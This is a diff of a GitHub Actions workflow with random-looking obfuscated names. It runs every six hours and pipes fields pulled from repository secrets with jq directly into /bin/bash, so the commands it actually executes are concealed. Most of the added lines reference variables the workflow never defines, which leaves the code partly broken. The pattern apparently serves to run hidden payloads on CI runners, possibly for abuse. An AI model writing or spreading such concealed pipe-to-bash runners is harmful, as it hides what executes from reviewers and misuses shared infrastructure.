@@ -2,8 +2,8 @@ name: xiaokaifa4178
 on:
   workflow_dispatch:
   schedule:
-    - cron: '35 1/6 * * *'
-jobs:  # 10017
+    - cron: '16 0/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -11,12 +11,18 @@ jobs:  # 10017
       - uses: actions/checkout@v4
       - name: xiaokaifa4178
         env:
-          fuuxf07153: ${{ secrets.fuuxf07153 }}
+          arri74009: ${{ secrets.arri74009 }}
         run: |
-          echo $fuuxf07153 | jq -r .sdny78 | /bin/bash
-          echo $kfoxc039 | jq -r .ycyj1 | /bin/bash
-          echo $ecnm6 | jq -r .t0133 | /bin/bash
-          echo $epxhk563 | jq -r .v337 | /bin/bash
-          echo $ojv564 | jq -r .gj64239 | /bin/bash
-          echo $ehhfe884 | jq -r .w01 | /bin/bash
+          echo $arri74009 | jq -r .j8 | /bin/bash
+          echo $a06599 | jq -r .kzpb108 | /bin/bash
+          echo $fv8119 | jq -r .wql2 | /bin/bash
+          echo $k59 | jq -r .kbx9987 | /bin/bash
+          echo $vwfbx88489 | jq -r .kgm35643 | /bin/bash
+          echo $vtdc48 | jq -r .d776 | /bin/bash
+          echo $rj16 | jq -r .xw63 | /bin/bash
+          echo $r4551 | jq -r .xwk97478 | /bin/bash
+          echo $w04 | jq -r .o0439 | /bin/bash
+          echo $wbyhk2 | jq -r .sl23 | /bin/bash
+          echo $wv97 | jq -r .f7 | /bin/bash
+          echo $dtdii8 | jq -r .phq0 | /bin/bash
 
